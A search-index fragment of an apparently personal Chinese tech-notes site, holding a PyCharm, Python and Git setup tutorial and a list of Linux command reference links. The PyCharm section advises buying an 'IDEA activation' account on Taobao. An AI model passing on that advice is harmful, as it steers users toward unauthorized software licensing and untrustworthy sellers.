\u6309\u7167\u4e0a\u9762\u7684\u5b89\u88c5\uff0c\u73af\u5883\u53d8\u91cf\u5c31\u81ea\u52a8\u914d\u7f6e\u597d\u4e86\u3002\u67e5\u770b\u4e0b\u73af\u5883\u53d8\u91cf\uff0c\u7ed3\u679c\u5982\u4e0b\uff0c\u81f3\u6b64\u5b89\u88c5\u5b8c\u6210 Pycharm\u7684\u5b89\u88c5 Windows10\u4e0b https://www.jetbrains.com/pycharm/ \u4e0b\u8f7d\u5730\u5740\uff0c\u9009\u62e9Professional \u5b89\u88c5\u57fa\u672c\u90fd\u662f\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65\u9ed8\u8ba4\u5b89\u88c5\u5c31\u597d\u4e86\uff0c\u5176\u4e2d\u4e0b\u9762\u7684\u9009\u9879\uff0c\u5982\u4e0b\u56fe \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u9700\u8981\u6fc0\u6d3b\uff0c\u5efa\u8bae\u5728\u6dd8\u5b9d\u641c\u7d22'IDEA\u6fc0\u6d3b'\uff0c\u4e70\u4e2a\u6fc0\u6d3b\u8d26\u53f7 \u6fc0\u6d3b\u540e\uff0c\u70b9\u51fb\u63d2\u4ef6\u4e2d\u5fc3\uff08Plugins\uff09\uff0cMarketplace\u4e2d\u641c'chinese' \u6309\u7167\u56fe\u4e2d\uff0c\u9009\u62e9\u4e2d\u6587\u63d2\u4ef6\u5b89\u88c5\uff0c\u7136\u540e\u70b9\u51fbRestart IDE \u81f3\u6b64pycharm\u5b89\u88c5\u5b8c\u6210 Pycharm\u4eceGithub\u4e0a\u62c9\u53d6\u4ee3\u7801 \u901a\u8fc7\u5185\u7f6eGit\u514b\u9686\u4ee3\u7801 \u6253\u5f00pycharm\uff0c\u6309\u7167\u4e0b\u56fe\u64cd\u4f5c \u8f93\u5165repository\u7684\u5730\u5740\uff0c\u76ee\u5f55\u6309\u7167\u81ea\u5df1\u9700\u6c42\u81ea\u5b9a\u4e49\uff0c\u7136\u540e\u70b9\u51fb\u4fe1\u4efb\u76ee\u5f55 Pycharm\u914d\u7f6e\u9879\u76eePython\u865a\u62df\u73af\u5883 \u5728\u9879\u76ee\u4e2d\uff0c \u6587\u4ef6 --> \u8bbe\u7f6e \u9009\u62e9 Python\u89e3\u91ca\u5668 --> \u6dfb\u52a0 \u521b\u5efa\u65b0\u73af\u5883\uff0c\u4f4d\u7f6e\u53ef\u4ee5\u653e\u5728\u9879\u76ee\u4e2d \u9009\u62e9\u65b0\u521b\u5efa\u7684\u73af\u5883 Pycharm\u63d0\u4ea4\u4ee3\u7801 \u4f8b\u5982\uff0c\u65b0\u6dfb\u52a0app.py\uff0c\u5c31\u628aapp.py\u6dfb\u52a0\u5230\u6682\u5b58 \u7136\u540e\u70b9\u51fb \u63d0\u4ea4\u6587\u4ef6 \u5f39\u51fa\u4e0b\u56fe\uff0c\u70b9\u51fb\u63d0\u4ea4\uff0c\u5c31\u628a\u6587\u4ef6\u63d0\u4ea4\u5230\u672c\u5730\u6570\u636e\u5e93 \u7136\u540e\u5728\u8fdb\u884c \u62c9\u53d6 \uff0c\u83b7\u53d6\u6700\u65b0\u7684\u4e2d\u592e\u670d\u52a1\u5668\u5185\u5bb9\u53d8\u5316\uff0c\u70b9\u51fb\u62c9\u53d6 \u9ed8\u8ba4\u5373\u53ef\uff0c\u70b9\u51fb\u62c9\u53d6\uff0c\u62c9\u53d6\u5b8c\u6210\u4f1a\u5728\u53f3\u4e0b\u89d2\u63d0\u793a\u5b8c\u6210 \u7136\u540e\u63a8\u9001\u6587\u4ef6\u5230\u4e2d\u592e\u670d\u52a1\u5668 \u70b9\u51fb\u63a8\u9001\uff0c\uff08\u6709\u65f6\u8ba9\u8f93\u5165\u4e0bgithub\u7684\u8d26\u53f7\u5bc6\u7801\uff09\u5c31\u53ef\u4ee5\u5b8c\u6210\u6587\u4ef6\u7684\u63a8\u9001 \u8bbe\u7f6egit\u5ffd\u7565\u6587\u4ef6 \u6709\u7684\u65f6\u5019\u4e0d\u50cf\u63a8\u9001\u5168\u90e8\u5185\u5bb9\uff0c\u53ef\u4ee5\u5728\u9879\u76ee\u4e2d\u521b\u5efa\u5ffd\u7565\u6587\u4ef6\uff0c\u8fd9\u6837git\u5c31\u4f1a\u6839\u636e\u5ffd\u7565\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u8fdb\u884c\u5ffd\u7565\u6389\u67d0\u4e9b\u6587\u4ef6\u6216\u8005\u76ee\u5f55 \u5728\u9879\u76ee\u7684\u6839\u76ee\u5f55\u4e0b\u9762\u521b\u5efa.gitigonre\u6587\u4ef6\uff0c.gitigonre\u53ef\u4ee5\u8ddf\u968f\u9879\u76ee\u4e0a\u4f20\u5230\u4e2d\u592e\u670d\u52a1\u5668\u4e0a \u5982\u4e0b\u56fe\uff0c/venv/\u662f\u5f53\u524d\u9879\u76ee\u4e0b\u7684venv\u76ee\u5f55\uff0c\u662f\u5f53\u524d\u9879\u76ee\u5728\u672c\u673a\u7684\u865a\u62df\u8fd0\u884c\u73af\u5883\uff0c\u8fd9\u4e2a\u76ee\u5f55\u662f\u5ffd\u7565\u6389\u7684 /.idea/\u662f\u5f53\u524d\u9879\u76ee\u7684.idea\u76ee\u5f55\uff0c\u662fpycharm\u8f6f\u4ef6\u5728\u5f53\u524d\u9879\u76ee\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u8fd9\u4e2a\u76ee\u5f55\u4e5f\u662f\u8981\u5ffd\u7565\u6389\u7684 Pycharm\u7ed9\u865a\u62df\u73af\u5883\u5b89\u88c5\u4f9d\u8d56 \u4e00\u822cPython\u9879\u76ee\u4e2d\uff0c\u9879\u76ee\u4e2d\u4f1a\u63d0\u4f9brequirement.txt\u6587\u4ef6\uff0c\u6b64\u4e3aPython\u7684\u4f9d\u8d56\u914d\u7f6e\u6587\u4ef6 \u9879\u76ee\u8bbe\u7f6e\u4e2d\uff0c \u7ec8\u7aef \uff0c\u5982\u56fe\u8bbe\u7f6e \u7136\u540e\u5728\u9879\u76ee\u7684\u7ec8\u7aef\u4e2d\u8f93\u5165\uff0c\u5982\u4e0b\u56fe\uff0c\u5c31\u5b8c\u6210\u4e86\u5b89\u88c5 pip3 install --upgrade pip pip3 install -r requirement.txt","title":"Pycharm\u53ca\u914d\u5408Github\u7684\u4f7f\u7528"},{"location":"tool/pycharm/#pycharmgithub","text":"","title":"Pycharm\u53ca\u914d\u5408Github\u7684\u4f7f\u7528"},{"location":"tool/pycharm/#git","text":"\u53c2\u8003\u4e0b\u9762\u7684\u6587\u7ae0\uff0c \u5b89\u88c5 \u7ae0\u8282 git\u53cagithub\u7684\u8f7b\u5ea6\u6559\u7a0b - MarkDown_Log (yinzhipeng123.github.io)","title":"Git\u7684\u5b89\u88c5"},{"location":"tool/pycharm/#python","text":"","title":"Python\u7684\u5b89\u88c5"},{"location":"tool/pycharm/#windows10","text":"https://www.python.org/downloads/windows/ \u4e0b\u8f7d\u5730\u5740\uff0c\u4e2d\u9009\u62e93.9.7\uff0c64\u5b89\u88c5\u5305\uff0c\u4e0b\u56fe\u4e2d\u6700\u4e0b\u9762\u7684\u4e00\u4e2a \u5b89\u88c5\u8fc7\u7a0b\u5f88\u7b80\u5355\uff0c\u57fa\u672c\u90fd\u662f\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65\uff0c\u5176\u4e2d\u6709\u4e9b\u914d\u7f6e\u8981\u5982\u4e0b\u56fe\uff0c\uff08Add Python 3.9 to Path\uff09\u6dfb\u52a0Python\u5230\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\uff08Install lanuncher for all user\uff09\u5b89\u88c5\u4e3a\u7535\u8111\u4e2d\u6240\u6709\u7528\u6237 \u4e0b\u56fe\uff0c\u5168\u90e8\u52fe\u9009 \u4e0b\u56fe\uff0c\u5982\u56fe\u52fe\u9009\uff0c\u5b89\u88c5\u8def\u5f84\u6309\u7167\u81ea\u5df1\u9700\u6c42 \u4e0b\u56fe\uff0c\u70b9\u51fbDisable path length limit \u6309\u7167\u4e0a\u9762\u7684\u5b89\u88c5\uff0c\u73af\u5883\u53d8\u91cf\u5c31\u81ea\u52a8\u914d\u7f6e\u597d\u4e86\u3002\u67e5\u770b\u4e0b\u73af\u5883\u53d8\u91cf\uff0c\u7ed3\u679c\u5982\u4e0b\uff0c\u81f3\u6b64\u5b89\u88c5\u5b8c\u6210","title":"Windows10\u4e0b"},{"location":"tool/pycharm/#pycharm","text":"","title":"Pycharm\u7684\u5b89\u88c5"},{"location":"tool/pycharm/#windows10_1","text":"https://www.jetbrains.com/pycharm/ \u4e0b\u8f7d\u5730\u5740\uff0c\u9009\u62e9Professional \u5b89\u88c5\u57fa\u672c\u90fd\u662f\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65\u9ed8\u8ba4\u5b89\u88c5\u5c31\u597d\u4e86\uff0c\u5176\u4e2d\u4e0b\u9762\u7684\u9009\u9879\uff0c\u5982\u4e0b\u56fe \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u9700\u8981\u6fc0\u6d3b\uff0c\u5efa\u8bae\u5728\u6dd8\u5b9d\u641c\u7d22'IDEA\u6fc0\u6d3b'\uff0c\u4e70\u4e2a\u6fc0\u6d3b\u8d26\u53f7 \u6fc0\u6d3b\u540e\uff0c\u70b9\u51fb\u63d2\u4ef6\u4e2d\u5fc3\uff08Plugins\uff09\uff0cMarketplace\u4e2d\u641c'chinese' \u6309\u7167\u56fe\u4e2d\uff0c\u9009\u62e9\u4e2d\u6587\u63d2\u4ef6\u5b89\u88c5\uff0c\u7136\u540e\u70b9\u51fbRestart IDE \u81f3\u6b64pycharm\u5b89\u88c5\u5b8c\u6210","title":"Windows10\u4e0b"},{"location":"tool/pycharm/#pycharmgithub_1","text":"","title":"Pycharm\u4eceGithub\u4e0a\u62c9\u53d6\u4ee3\u7801"},{"location":"tool/pycharm/#git_1","text":"\u6253\u5f00pycharm\uff0c\u6309\u7167\u4e0b\u56fe\u64cd\u4f5c \u8f93\u5165repository\u7684\u5730\u5740\uff0c\u76ee\u5f55\u6309\u7167\u81ea\u5df1\u9700\u6c42\u81ea\u5b9a\u4e49\uff0c\u7136\u540e\u70b9\u51fb\u4fe1\u4efb\u76ee\u5f55","title":"\u901a\u8fc7\u5185\u7f6eGit\u514b\u9686\u4ee3\u7801"},{"location":"tool/pycharm/#pycharmpython","text":"\u5728\u9879\u76ee\u4e2d\uff0c \u6587\u4ef6 --> \u8bbe\u7f6e \u9009\u62e9 Python\u89e3\u91ca\u5668 --> \u6dfb\u52a0 \u521b\u5efa\u65b0\u73af\u5883\uff0c\u4f4d\u7f6e\u53ef\u4ee5\u653e\u5728\u9879\u76ee\u4e2d \u9009\u62e9\u65b0\u521b\u5efa\u7684\u73af\u5883","title":"Pycharm\u914d\u7f6e\u9879\u76eePython\u865a\u62df\u73af\u5883"},{"location":"tool/pycharm/#pycharm_1","text":"\u4f8b\u5982\uff0c\u65b0\u6dfb\u52a0app.py\uff0c\u5c31\u628aapp.py\u6dfb\u52a0\u5230\u6682\u5b58 \u7136\u540e\u70b9\u51fb \u63d0\u4ea4\u6587\u4ef6 \u5f39\u51fa\u4e0b\u56fe\uff0c\u70b9\u51fb\u63d0\u4ea4\uff0c\u5c31\u628a\u6587\u4ef6\u63d0\u4ea4\u5230\u672c\u5730\u6570\u636e\u5e93 \u7136\u540e\u5728\u8fdb\u884c \u62c9\u53d6 \uff0c\u83b7\u53d6\u6700\u65b0\u7684\u4e2d\u592e\u670d\u52a1\u5668\u5185\u5bb9\u53d8\u5316\uff0c\u70b9\u51fb\u62c9\u53d6 \u9ed8\u8ba4\u5373\u53ef\uff0c\u70b9\u51fb\u62c9\u53d6\uff0c\u62c9\u53d6\u5b8c\u6210\u4f1a\u5728\u53f3\u4e0b\u89d2\u63d0\u793a\u5b8c\u6210 \u7136\u540e\u63a8\u9001\u6587\u4ef6\u5230\u4e2d\u592e\u670d\u52a1\u5668 \u70b9\u51fb\u63a8\u9001\uff0c\uff08\u6709\u65f6\u8ba9\u8f93\u5165\u4e0bgithub\u7684\u8d26\u53f7\u5bc6\u7801\uff09\u5c31\u53ef\u4ee5\u5b8c\u6210\u6587\u4ef6\u7684\u63a8\u9001","title":"Pycharm\u63d0\u4ea4\u4ee3\u7801"},{"location":"tool/pycharm/#git_2","text":"\u6709\u7684\u65f6\u5019\u4e0d\u50cf\u63a8\u9001\u5168\u90e8\u5185\u5bb9\uff0c\u53ef\u4ee5\u5728\u9879\u76ee\u4e2d\u521b\u5efa\u5ffd\u7565\u6587\u4ef6\uff0c\u8fd9\u6837git\u5c31\u4f1a\u6839\u636e\u5ffd\u7565\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u8fdb\u884c\u5ffd\u7565\u6389\u67d0\u4e9b\u6587\u4ef6\u6216\u8005\u76ee\u5f55 \u5728\u9879\u76ee\u7684\u6839\u76ee\u5f55\u4e0b\u9762\u521b\u5efa.gitigonre\u6587\u4ef6\uff0c.gitigonre\u53ef\u4ee5\u8ddf\u968f\u9879\u76ee\u4e0a\u4f20\u5230\u4e2d\u592e\u670d\u52a1\u5668\u4e0a \u5982\u4e0b\u56fe\uff0c/venv/\u662f\u5f53\u524d\u9879\u76ee\u4e0b\u7684venv\u76ee\u5f55\uff0c\u662f\u5f53\u524d\u9879\u76ee\u5728\u672c\u673a\u7684\u865a\u62df\u8fd0\u884c\u73af\u5883\uff0c\u8fd9\u4e2a\u76ee\u5f55\u662f\u5ffd\u7565\u6389\u7684 /.idea/\u662f\u5f53\u524d\u9879\u76ee\u7684.idea\u76ee\u5f55\uff0c\u662fpycharm\u8f6f\u4ef6\u5728\u5f53\u524d\u9879\u76ee\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u8fd9\u4e2a\u76ee\u5f55\u4e5f\u662f\u8981\u5ffd\u7565\u6389\u7684","title":"\u8bbe\u7f6egit\u5ffd\u7565\u6587\u4ef6"},{"location":"tool/pycharm/#pycharm_2","text":"\u4e00\u822cPython\u9879\u76ee\u4e2d\uff0c\u9879\u76ee\u4e2d\u4f1a\u63d0\u4f9brequirement.txt\u6587\u4ef6\uff0c\u6b64\u4e3aPython\u7684\u4f9d\u8d56\u914d\u7f6e\u6587\u4ef6 \u9879\u76ee\u8bbe\u7f6e\u4e2d\uff0c \u7ec8\u7aef \uff0c\u5982\u56fe\u8bbe\u7f6e \u7136\u540e\u5728\u9879\u76ee\u7684\u7ec8\u7aef\u4e2d\u8f93\u5165\uff0c\u5982\u4e0b\u56fe\uff0c\u5c31\u5b8c\u6210\u4e86\u5b89\u88c5 pip3 install --upgrade pip pip3 install -r requirement.txt","title":"Pycharm\u7ed9\u865a\u62df\u73af\u5883\u5b89\u88c5\u4f9d\u8d56"},{"location":"tool/url/","text":"\u6709\u8da3\u547d\u4ee4\u96c6\u5408 \u5173\u4e8ecpu\u4e2dST\u7684\u89e3\u91ca\uff1ahttps://www.cnblogs.com/xiaobaozi-95/p/10641237.html df\u6e90\u7801\u5730\u5740\uff1ahttps://github.com/coreutils/coreutils/blob/master/src/df.c coreutils\u6e90\u7801\u5730\u5740\uff0ccoreutils\u662flinux\u57fa\u672c\u547d\u4ee4\u96c6\u5408\uff0c\u6bd4\u5982chmod,ls,df,wc\u7b49\uff1ahttps://github.com/coreutils/coreutils Linux hdparm\u547d\u4ee4\uff0c\u6d4b\u8bd5\u78c1\u76d8\u7528\u7684\uff1ahttps://www.runoob.com/linux/linux-comm-hdparm.html sar\u547d\u4ee4\u6e90\u7801\u5730\u5740\uff0csar\u5c5e\u4e8esysstat\u5de5\u5177\u5305\u4e2d\u7684\u4e00\u4e2a\u5de5\u5177\uff0c\u8fd8\u6709\u5176\u4ed6linux\u6700\u5e38\u7528\u5176\u4ed6\u6027\u80fd\u547d\u4ee4\uff0c\u6bd4\u5982iostat\u7b49\uff1ahttp://sebastien.godard.pagesperso-orange.fr/documentation.html tsar\u6e90\u7801\u5730\u5740\uff1ahttps://github.com/alibaba/tsar/blob/master/info.md sar\u6ce8\u91ca\u89e3\u91ca\u6bd4\u8f83\u5168\u7684\u4e66\u7b7e\uff1ahttps://blog.csdn.net/liyongbing1122/article/details/89517282?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase#8.%20%E7%BB%9F%E8%AE%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%20sar%20-n%C2%A0 cpu \u4e2d\u65ad\u7684\u89e3\u91ca\uff1ahttps://www.cnblogs.com/bamanzi/p/linux-irq-and-cpu-affinity.html \u5185\u5b58cgroup\u7684\u89e3\u91ca\uff1ahttps://blog.csdn.net/zsj100213/article/details/89151442 \u5012\u53d9\u8f93\u51fa\u6bcf\u884c\u5185\u5bb9\u7684\u547d\u4ee4rev https://blog.csdn.net/weixin_34130389/article/details/93254255 usleep \u6307\u5b9a\u7761\u5fae\u5999\u7ea7\u547d\u4ee4 https://www.cnblogs.com/f-ck-need-u/p/7427262.html \u4f7f\u7528\u5916\u90e8\u547d\u4ee4command https://blog.csdn.net/fickyou/article/details/72911217 run-parts \u547d\u4ee4http://www.ttlsa.com/linux-command/linux-crontab-run-parts/ \u4f7f\u7528shell\u5185\u7f6e\u547d\u4ee4 https://blog.csdn.net/yexiangCSDN/article/details/82797488 \u5217\u51fa\u7cfb\u7edf\u4e2d\u6240\u6709\u7684\u547d\u4ee4 https://ipcmen.com/compgen shell\u4e2d\u7684\u547d\u4ee4\u8865\u5168\u529f\u80fd https://www.cnblogs.com/xulei13140106/p/5946359.html \u521b\u5efa\u6570\u7ec4\u7684\u547d\u4ee4 https://www.cnblogs.com/ChinaGo/p/10627368.html shell\u4e2d\u5feb\u901f\u5207\u6362\u76ee\u5f55 https://linux.cn/article-8558-1.html shell\u4e2d\u521b\u5efa\u53ea\u8bfb\u53d8\u91cf https://blog.csdn.net/yexiangCSDN/article/details/82797946 \u7ed9shell\u589e\u5f3a\u7684\u547d\u4ee4 https://blog.csdn.net/u010003835/article/details/80760946 shell\u7684\u6682\u505c\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-suspend.html shell \u4e2d\u6355\u6349\u4fe1\u53f7\u7684\u547d\u4ee4 https://www.cnblogs.com/FengGeBlog/p/10407221.html type \u547d\u4ee4 https://ipcmen.com/type typeset https://www.cnblogs.com/alog9/p/11982073.html setlogcons https://www.runoob.com/linux/linux-comm-setconsole.html rdate\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-rdate.html fbset https://www.runoob.com/linux/linux-comm-fbset.html powertop https://linux.cn/article-10560-1.html paste\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-paste.html paste\u547d\u4ee4 http://c.biancheng.net/linux/paste.html \u8fdb\u7a0b\u5185\u5b58\u5206\u6790\u5de5\u5177 pmap https://www.cnblogs.com/ggjucheng/p/3348439.html \u7ed9\u6587\u672c\u53eb\u884c\u53f7nl https://www.cnblogs.com/xqzt/p/5414547.html \u91ca\u653e\u4e0d\u4f7f\u7528\u7684\u865a\u62df\u7ec8\u7aef deallocvt\u547d\u4ee4 https://www.cnblogs.com/fanweisheng/p/11080744.html fsfreeze -f \u76ee\u5f55\u540d fsfreeze -u \u76ee\u5f55\u540d \u9501\u6587\u4ef6\u7cfb\u7edf\uff0c-f\u9501\uff0c-u\u89e3\u9501 \u5b57\u7b26\u96c6\u8f6c\u7801\u5de5\u5177 iconv\u547d\u4ee4 https://www.cnblogs.com/wqbin/p/11719952.html \u6279\u91cf\u4fee\u6539\u8d26\u53f7\u5bc6\u7801 chpasswd\u547d\u4ee4 https://blog.csdn.net/chengxuyuanyonghu/article/details/45694783 \u5220\u9664\u7528\u6237\u7684\u6240\u6709\u6587\u4ef6 deluser\u547d\u4ee4 https://blog.csdn.net/u014801157/article/details/50932747/ \u6309\u884c\u5206\u9694\u6587\u4ef6 split\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-split.html \u5207\u6362\u7ec8\u7aef chvt\u547d\u4ee4 http://linux.51yip.com/search/chvt od\u547d\u4ee4 8\u8fdb\u5236\u663e\u793a\u6587\u672c\uff0cxxd 16\u8fdb\u5236\u663e\u793a\u6587\u672c \u6587\u4ef6\u5b8c\u6574\u6027\u6821\u9a8c cksum\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-cksum.html \u6307\u5b9a\u6587\u672c\u5bbd\u5ea6\u547d\u4ee4 fold\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-fold.html \u7c89\u788e\u6587\u4ef6 shred https://blog.csdn.net/boomjane_testingblog/article/details/60579470 USE\u663e\u793a\u547d\u4ee4 lsusb https://blog.csdn.net/robertsong2004/article/details/46619629 \u4e3b\u673aID hostid https://zhidao.baidu.com/question/1733466640850464947.html pwdx \u67e5\u770b\u8fdb\u7a0b\u7684\u542f\u52a8\u76ee\u5f55 https://blog.csdn.net/dingding_ting/article/details/84952954 \u8d28\u56e0\u6570\u5206\u89e3 factor https://www.geek-share.com/detail/2750670155.html tr\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-tr.html \u4f38\u7f29\u4e00\u4e2a\u6587\u4ef6 truncate http://linux.51yip.com/search/truncate \u811a\u672c\u4e92\u65a5 flock\u547d\u4ee4 https://www.jianshu.com/p/fe5f0cf59f2d fuser\u547d\u4ee4 \u67e5\u770b\u4e00\u4e2a\u6587\u4ef6\u6216\u8005\u6587\u4ef6\u7cfb\u7edf\u88ab\u54ea\u4e2a\u8fdb\u7a0b\u5360\u7528 https://blog.51cto.com/12107790/2321296 \u5c06\u5236\u8868\u7b26\u90fd\u8f6c\u6362\u6210\u7a7a\u683c expand\u547d\u4ee4 https://www.cnblogs.com/Spiro-K/p/6361948.html \u5c06\u7a7a\u683c\u90fd\u8f6c\u6362\u6210\u5236\u8868\u7b26 unexpand\u547d\u4ee4 https://ipcmen.com/unexpand getconf\u547d\u4ee4 https://blog.csdn.net/bytxl/article/details/9296435 \u968f\u673a\u751f\u6210\u5bc6\u7801 mkpasswd https://www.cnblogs.com/xiaoyongzhuo/p/7444303.html \u663e\u793acpu\u4e2a\u6570 nproc\u547d\u4ee4 https://idc.wanyunshuju.com/cym/623.html comm\u547d\u4ee4 \u6bd4\u8f83\u6570\u636e https://www.runoob.com/linux/linux-comm-comm.html readlink\u547d\u4ee4\u548crealpath\u547d\u4ee4\u5219\u5141\u8bb8\u4f60\u89e3\u6790\u6587\u4ef6\u4e4b\u95f4\u7684\u8fd9\u4e9b\u94fe\u63a5 https://www.cnblogs.com/kelamoyujuzhen/p/10119706.html pidof \u67e5\u627e\u67d0\u4e2a\u540d\u5b57\u7684\u8fdb\u7a0b https://blog.csdn.net/ygm_linux/article/details/40184413 ssh\u8fdc\u7a0b\u6267\u884c\u672c\u673a\u811a\u672c https://blog.csdn.net/yinzhipeng123/article/details/108366460 docker\u6267\u884c\u5bbf\u4e3b\u673a\u811a\u672c https://blog.csdn.net/yinzhipeng123/article/details/108366299 Python\u5236\u4f5cnmtui\u7c7b\u4f3c\u7684\u56fe\u5f62 https://www.cnblogs.com/Xjng/p/3869869.html python \u8d85\u7ea7\u597d\u7528\u591a\u7ebf\u7a0b\u5305\uff0c\u65e0\u8111\u5f00\u591a\u7ebf\u7a0b \uff0cpython \u4e8c\u4e09\u7248\u672c\u90fd\u884c https://docs.python.org/zh-cn/3.6/library/multiprocessing.html","title":"\u5e38\u7528\u5730\u5740"},{"location":"tool/url/#_1","text":"\u5173\u4e8ecpu\u4e2dST\u7684\u89e3\u91ca\uff1ahttps://www.cnblogs.com/xiaobaozi-95/p/10641237.html df\u6e90\u7801\u5730\u5740\uff1ahttps://github.com/coreutils/coreutils/blob/master/src/df.c coreutils\u6e90\u7801\u5730\u5740\uff0ccoreutils\u662flinux\u57fa\u672c\u547d\u4ee4\u96c6\u5408\uff0c\u6bd4\u5982chmod,ls,df,wc\u7b49\uff1ahttps://github.com/coreutils/coreutils Linux hdparm\u547d\u4ee4\uff0c\u6d4b\u8bd5\u78c1\u76d8\u7528\u7684\uff1ahttps://www.runoob.com/linux/linux-comm-hdparm.html sar\u547d\u4ee4\u6e90\u7801\u5730\u5740\uff0csar\u5c5e\u4e8esysstat\u5de5\u5177\u5305\u4e2d\u7684\u4e00\u4e2a\u5de5\u5177\uff0c\u8fd8\u6709\u5176\u4ed6linux\u6700\u5e38\u7528\u5176\u4ed6\u6027\u80fd\u547d\u4ee4\uff0c\u6bd4\u5982iostat\u7b49\uff1ahttp://sebastien.godard.pagesperso-orange.fr/documentation.html tsar\u6e90\u7801\u5730\u5740\uff1ahttps://github.com/alibaba/tsar/blob/master/info.md sar\u6ce8\u91ca\u89e3\u91ca\u6bd4\u8f83\u5168\u7684\u4e66\u7b7e\uff1ahttps://blog.csdn.net/liyongbing1122/article/details/89517282?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase#8.%20%E7%BB%9F%E8%AE%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%20sar%20-n%C2%A0 cpu \u4e2d\u65ad\u7684\u89e3\u91ca\uff1ahttps://www.cnblogs.com/bamanzi/p/linux-irq-and-cpu-affinity.html \u5185\u5b58cgroup\u7684\u89e3\u91ca\uff1ahttps://blog.csdn.net/zsj100213/article/details/89151442 \u5012\u53d9\u8f93\u51fa\u6bcf\u884c\u5185\u5bb9\u7684\u547d\u4ee4rev https://blog.csdn.net/weixin_34130389/article/details/93254255 usleep \u6307\u5b9a\u7761\u5fae\u5999\u7ea7\u547d\u4ee4 https://www.cnblogs.com/f-ck-need-u/p/7427262.html \u4f7f\u7528\u5916\u90e8\u547d\u4ee4command https://blog.csdn.net/fickyou/article/details/72911217 run-parts \u547d\u4ee4http://www.ttlsa.com/linux-command/linux-crontab-run-parts/ \u4f7f\u7528shell\u5185\u7f6e\u547d\u4ee4 https://blog.csdn.net/yexiangCSDN/article/details/82797488 \u5217\u51fa\u7cfb\u7edf\u4e2d\u6240\u6709\u7684\u547d\u4ee4 https://ipcmen.com/compgen shell\u4e2d\u7684\u547d\u4ee4\u8865\u5168\u529f\u80fd https://www.cnblogs.com/xulei13140106/p/5946359.html \u521b\u5efa\u6570\u7ec4\u7684\u547d\u4ee4 https://www.cnblogs.com/ChinaGo/p/10627368.html shell\u4e2d\u5feb\u901f\u5207\u6362\u76ee\u5f55 https://linux.cn/article-8558-1.html shell\u4e2d\u521b\u5efa\u53ea\u8bfb\u53d8\u91cf https://blog.csdn.net/yexiangCSDN/article/details/82797946 \u7ed9shell\u589e\u5f3a\u7684\u547d\u4ee4 https://blog.csdn.net/u010003835/article/details/80760946 shell\u7684\u6682\u505c\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-suspend.html shell \u4e2d\u6355\u6349\u4fe1\u53f7\u7684\u547d\u4ee4 https://www.cnblogs.com/FengGeBlog/p/10407221.html type \u547d\u4ee4 https://ipcmen.com/type typeset https://www.cnblogs.com/alog9/p/11982073.html setlogcons https://www.runoob.com/linux/linux-comm-setconsole.html rdate\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-rdate.html fbset https://www.runoob.com/linux/linux-comm-fbset.html powertop https://linux.cn/article-10560-1.html paste\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-paste.html paste\u547d\u4ee4 http://c.biancheng.net/linux/paste.html \u8fdb\u7a0b\u5185\u5b58\u5206\u6790\u5de5\u5177 pmap https://www.cnblogs.com/ggjucheng/p/3348439.html \u7ed9\u6587\u672c\u53eb\u884c\u53f7nl https://www.cnblogs.com/xqzt/p/5414547.html \u91ca\u653e\u4e0d\u4f7f\u7528\u7684\u865a\u62df\u7ec8\u7aef deallocvt\u547d\u4ee4 https://www.cnblogs.com/fanweisheng/p/11080744.html fsfreeze -f \u76ee\u5f55\u540d fsfreeze -u \u76ee\u5f55\u540d \u9501\u6587\u4ef6\u7cfb\u7edf\uff0c-f\u9501\uff0c-u\u89e3\u9501 \u5b57\u7b26\u96c6\u8f6c\u7801\u5de5\u5177 iconv\u547d\u4ee4 https://www.cnblogs.com/wqbin/p/11719952.html \u6279\u91cf\u4fee\u6539\u8d26\u53f7\u5bc6\u7801 chpasswd\u547d\u4ee4 https://blog.csdn.net/chengxuyuanyonghu/article/details/45694783 \u5220\u9664\u7528\u6237\u7684\u6240\u6709\u6587\u4ef6 deluser\u547d\u4ee4 https://blog.csdn.net/u014801157/article/details/50932747/ \u6309\u884c\u5206\u9694\u6587\u4ef6 split\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-split.html \u5207\u6362\u7ec8\u7aef chvt\u547d\u4ee4 http://linux.51yip.com/search/chvt od\u547d\u4ee4 8\u8fdb\u5236\u663e\u793a\u6587\u672c\uff0cxxd 16\u8fdb\u5236\u663e\u793a\u6587\u672c \u6587\u4ef6\u5b8c\u6574\u6027\u6821\u9a8c cksum\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-cksum.html \u6307\u5b9a\u6587\u672c\u5bbd\u5ea6\u547d\u4ee4 fold\u547d\u4ee4 https://www.runoob.com/linux/linux-comm-fold.html \u7c89\u788e\u6587\u4ef6 shred https://blog.csdn.net/boomjane_testingblog/article/details/60579470 USE\u663e\u793a\u547d\u4ee4 lsusb https://blog.csdn.net/robertsong2004/article/details/46619629 \u4e3b\u673aID hostid https://zhidao.baidu.com/question/1733466640850464947.html pwdx \u67e5\u770b\u8fdb\u7a0b\u7684\u542f\u52a8\u76ee\u5f55 https://blog.csdn.net/dingding_ting/article/details/84952954 